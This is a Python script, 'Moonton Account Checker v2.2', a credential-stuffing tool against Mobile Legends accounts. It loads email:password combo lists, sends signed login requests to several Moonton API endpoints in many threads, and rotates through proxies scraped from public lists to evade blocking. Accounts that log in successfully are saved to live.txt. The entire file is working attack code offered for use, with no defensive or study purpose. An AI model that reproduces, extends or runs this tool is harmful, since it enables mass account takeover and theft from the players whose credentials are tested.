#!/usr/bin/env python3
# coding=utf-8
"""Moonton Account Checker v2.2 - with Proxy Support"""

import requests
import os
import sys
import hashlib
import json
import argparse
import time
from multiprocessing.pool import ThreadPool

API_ENDPOINTS = {
    '1': 'https://accountmtapi.mobilelegends.com/',
    '2': 'https://mtacc.mobilelegends.com/v2.1/inapp/login-new',
    '3': 'https://api.mobilelegends.com/login',
}
DEFAULT_API = 'https://accountmtapi.mobilelegends.com/'

# Proxy scraper URLs (from BoltChecker)
PROXY_URLS = [
    'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000',
    'https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://multiproxy.org/txt_all/proxy.txt',
]

def print_banner():
    print('''
 _  _     _ _  _ __    _ ______      
|_||_    | |_| |_   | |  _ |  _ 
|  _|   | |   |    | |_| |  _ |  
|_|     |___| |____|_______|___| 


| Moonton Checker v2.2 + Proxy |
''')

def show_proxy_menu():
    print('''
[PROXY OPTIONS]
  --proxy FILE     Use proxies from file
  --proxy scrape   Auto-scrape proxies
  --proxy none    No proxy (direct)
''')

def show_api_help():
    print("\n[API ENDPOINTS]")
    for k, v in API_ENDPOINTS.items():
        print(f"  {k}. {v}")
    print("\nUsage: python3 main.py list.txt [--api NUM] [--url URL] [--proxy FILE]")

class ProxyScraper:
    """Proxy scraper from BoltChecker"""
    
    def __init__(self):
        self.proxies = []
    
    def scrape(self, output_file='proxies.txt', timeout=15):
        """Scrape proxies from multiple sources"""
        print("[*] Starting proxy scrape...")
        scraped = []
        
        for url in PROXY_URLS:
            try:
                print(f"    Fetching: {url[:50]}...")
                r = requests.get(url, timeout=timeout)
                lines = r.text.split('\n')
                for line in lines:
                    line = line.strip()
                    # Validate proxy format (IP:PORT)
                    if ':' in line and line.count(':') == 1:
                        try:
                            ip, port = line.split(':')
                            if ip and port.isdigit() and 0 < int(port) < 65536:
                                scraped.append(line)
                        except: pass
                print(f"        Got {len(lines)} lines")
            except Exception as e:
                print(f"        Error: {e}")
                continue
        
        # Remove duplicates
        scraped = list(set(scraped))
        print(f"\n[*] Total unique proxies: {len(scraped)}")
        
        if scraped:
            with open(output_file, 'w') as f:
                f.write('\n'.join(scraped))
            print(f"[+] Saved to: {output_file}")
        
        return scraped

class MOONTON:
    def __init__(self, api=None, proxy_file=None):
        self.userdata = []
        self.live = []
        self.die = []
        self.api = api or DEFAULT_API
        self.proxies = []
        self.proxy_file = proxy_file
        self.proxy_index = 0
    
    def load_proxies(self, filepath):
        """Load proxies from file"""
        if not filepath or not os.path.exists(filepath):
            return []
        with open(filepath, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(proxies)} proxies")
        return proxies
    
    def get_proxy(self):
        """Get next proxy (rotates through list)"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def build_params(self, user):
        md5 = hashlib.new('md5')
        md5.update(user['pw'].encode('utf-8'))
        pw_hash = md5.hexdigest()
        sign = f"account={user['email']}&md5pwd={pw_hash}&op=login"
        md5 = hashlib.new('md5')
        md5.update(sign.encode('utf-8'))
        sign_hash = md5.hexdigest()
        return json.dumps({
            'op': 'login',
            'sign': sign_hash,
            'params': {'account': user['email'], 'md5pwd': pw_hash},
            'lang': 'cn'
        })
    
    def validate(self, user):
        try:
            data = self.build_params(user)
            headers = {'Content-Type': 'application/json'}
            
            # Use proxy if available
            proxies = self.get_proxy() if self.proxies else None
            
            r = requests.post(self.api, data=data, headers=headers, 
                          proxies=proxies, timeout=30)
            
            if r.status_code == 200:
                try:
                    j = r.json()
                    if j.get('message') == 'Error_Success':
                        print(f'[LIVE] {user["userdata"]}')
                        self.live.append(user['userdata'])
                        return
                except: pass
            
            proxy_info = f" [proxy]" if proxies else ""
            print(f'[DEAD] {user["userdata"]}{proxy_info}')
            self.die.append(user['userdata'])
        except Exception as e:
            print(f'[ERROR] {user["userdata"]} - {e}')
            self.die.append(user['userdata'])
    
    def check_file(self, filepath, threads=20):
        with open(filepath, 'r', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'): continue
                if '|' in line:
                    p = line.split('|')
                    if len(p) >= 2 and p[0] and p[1]:
                        self.userdata.append({'email': p[0], 'pw': p[1], 'userdata': line})
                        continue
                if ':' in line:
                    p = line.split(':')
                    if len(p) >= 2 and p[0] and p[1]:
                        self.userdata.append({'email': p[0], 'pw': p[1], 'userdata': line})
        
        if not self.userdata:
            print('[!] No valid accounts')
            return False
        
        print(f'[*] {len(self.userdata)} accounts')
        print(f'[*] API: {self.api}')
        
        ThreadPool(threads).map(self.validate, self.userdata)
        return True
    
    def save_results(self):
        if self.live: 
            with open('live.txt', 'w') as f:
                f.write('\n'.join(self.live))
        if self.die: 
            with open('die.txt', 'w') as f:
                f.write('\n'.join(self.die))
        
        print(f'\n[#] LIVE: {len(self.live)} | DEAD: {len(self.die)}')
        if not self.live: show_api_help()

def main():
    print_banner()
    p = argparse.ArgumentParser()
    p.add_argument('file', nargs='?')
    p.add_argument('--api')
    p.add_argument('--url')
    p.add_argument('--threads', type=int, default=20)
    p.add_argument('--proxy')
    a = p.parse_args()
    
    # Handle proxy options
    proxy_file = None
    if a.proxy:
        if a.proxy.lower() == 'scrape':
            print("[*] Scraping proxies...")
            scraper = ProxyScraper()
            scraped = scraper.scrape('proxies.txt')
            if scraped:
                proxy_file = 'proxies.txt'
        elif a.proxy.lower() == 'none':
            proxy_file = None
        elif os.path.exists(a.proxy):
            proxy_file = a.proxy
        else:
            print(f"[!] Proxy file not found: {a.proxy}")
    
    f = a.file or input('[?] File: ').strip()
    if not f or not os.path.exists(f): 
        sys.exit('[!] File not found')
    
    c = MOONTON(proxy_file=proxy_file)
    
    if a.api and a.api in API_ENDPOINTS: 
        c.api = API_ENDPOINTS[a.api]
    if a.url: 
        c.api = a.url
    
    if c.proxy_file:
        c.proxies = c.load_proxies(c.proxy_file)
    
    if c.check_file(f, a.threads): 
        c.save_results()

def scrape_proxies():
    """Standalone proxy scraping"""
    print_banner()
    scraper = ProxyScraper()
    output = input('[?] Save proxies to file: ').strip() or 'proxies.txt'
    scraper.scrape(output)
    print("\nDone!")

if __name__ == '__main__':
    # Check for --scrape-only flag
    if len(sys.argv) > 1 and sys.argv[1] == '--scrape':
        scrape_proxies()
    else:
        main()